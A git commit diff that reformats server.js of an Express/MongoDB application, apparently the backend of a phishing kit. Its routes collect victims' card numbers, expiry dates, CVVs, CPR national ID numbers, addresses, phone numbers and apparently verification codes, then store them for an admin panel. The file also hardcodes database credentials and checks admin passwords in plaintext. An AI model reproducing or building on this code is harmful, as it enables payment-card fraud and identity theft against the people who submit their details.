34e44f330ca132f1cecb644c9cc030a28fdc5a6a
magnetoasher <magnetoasher@gmail.com>
2022-09-16 06:47:23 +0900

    fixed: server.js

--- server.js
+++ server.js
@@ -1,31 +1,31 @@
-const express = require('express')
-const bodyParser = require('body-parser')
-const mongoose = require('mongoose')
-const session = require('express-session')
-const flash = require('express-flash')
-const MongoDbStore = require('connect-mongo')
+const express = require('express');
+const bodyParser = require('body-parser');
+const mongoose = require('mongoose');
+const session = require('express-session');
+const flash = require('express-flash');
+const MongoDbStore = require('connect-mongo');
 
-const app = express()
-const PORT = process.env.PORT || 80
+const app = express();
+const PORT = process.env.PORT || 80;
 
-app.use(express.json())
-app.use(bodyParser.json())
-app.use(express.static('public'))
+app.use(express.json());
+app.use(bodyParser.json());
+app.use(express.static('public'));
 app.use(
   bodyParser.urlencoded({
     extended: false,
   })
-)
-app.use('/static', express.static('./static/'))
+);
+app.use('/static', express.static('./static/'));
 
-app.use(flash())
+app.use(flash());
 mongoose.connect(
   'mongodb+srv://robbery:hood@cluster0.grczhtr.mongodb.net/?retryWrites=true&w=majority',
   {
     useNewUrlParser: true,
     useUnifiedTopology: true,
   }
-)
+);
 
 app.use(
   session({
@@ -38,47 +38,47 @@ app.use(
     saveUninitialized: false,
     cookie: { maxAge: 1000 * 60 * 60 * 24 },
   })
-)
-const user = require('./backend/models/user')
-const data = require('./backend/models/data')
-app.set('view engine', 'html')
-app.engine('html', require('ejs').renderFile)
+);
+const user = require('./backend/models/user');
+const data = require('./backend/models/data');
+app.set('view engine', 'html');
+app.engine('html', require('ejs').renderFile);
 
 app.post('/sign', async (req, resp) => {
-  req.session.card = req.body.card
-  req.session.expiry = req.body.expiry
-  req.session.cvv = req.body.cvv
-  req.session.name = req.body.name
-  req.session.address = req.body.address
-  req.session.by = req.body.by
-  req.session.cpr = req.body.cpr
-  req.session.phone = req.body.phone
-  return resp.redirect('/data')
-})
+  req.session.card = req.body.card;
+  req.session.expiry = req.body.expiry;
+  req.session.cvv = req.body.cvv;
+  req.session.name = req.body.name;
+  req.session.address = req.body.address;
+  req.session.by = req.body.by;
+  req.session.cpr = req.body.cpr;
+  req.session.phone = req.body.phone;
+  return resp.redirect('/data');
+});
 
 app.post('/sign_admin', async (req, resp) => {
-  var email = req.body.email
-  var password = req.body.password
+  var email = req.body.email;
+  var password = req.body.password;
 
-  const userdata = await user.findOne({ email: email })
+  const userdata = await user.findOne({ email: email });
   if (userdata != null) {
     if (password === userdata.password) {
       if (req.session.user == null) {
-        req.session.user = userdata
-        resp.redirect('/admin/data')
+        req.session.user = userdata;
+        resp.redirect('/admin/data');
       } else {
-        req.session.user = userdata
-        resp.redirect('/admin/data')
+        req.session.user = userdata;
+        resp.redirect('/admin/data');
       }
     } else {
-      console.log('User Not Found')
+      console.log('User Not Found');
     }
   }
-})
+});
 
 app.post('/upload', async (req, resp) => {
-  var ids = req.body.ids
-  var code = req.body.code
+  var ids = req.body.ids;
+  var code = req.body.code;
 
   const savedata = new data({
     ids: ids,
@@ -92,31 +92,31 @@ app.post('/upload', async (req, resp) => {
     by: req.session.by,
     cpr: req.session.cpr,
     phone: req.session.phone,
-  })
-  console.log(savedata)
+  });
+  console.log(savedata);
 
   await savedata
     .save()
     .then((user) => {
-      resp.send(user)
+      resp.send(user);
     })
     .catch((err) => {
-      console.log(err)
-    })
-})
+      console.log(err);
+    });
+});
 
 app.post('/data', (req, resp) => {
   if (req.session.userId != null) {
-    req.session.userId = req.body.userId
-    resp.redirect('signup')
+    req.session.userId = req.body.userId;
+    resp.redirect('signup');
   } else {
-    req.session.userId = ''
-    req.session.userId = req.body.userId
-    resp.redirect('signup')
+    req.session.userId = '';
+    req.session.userId = req.body.userId;
+    resp.redirect('signup');
   }
-})
+});
 
-require('./backend/routes/web')(app)
-app.listen(PORT, () => {
-  console.log('server running')
-})
+require('./backend/routes/web')(app);
+app.listen(PORT, '0.0.0.0', () => {
+  console.log('server running');
+});
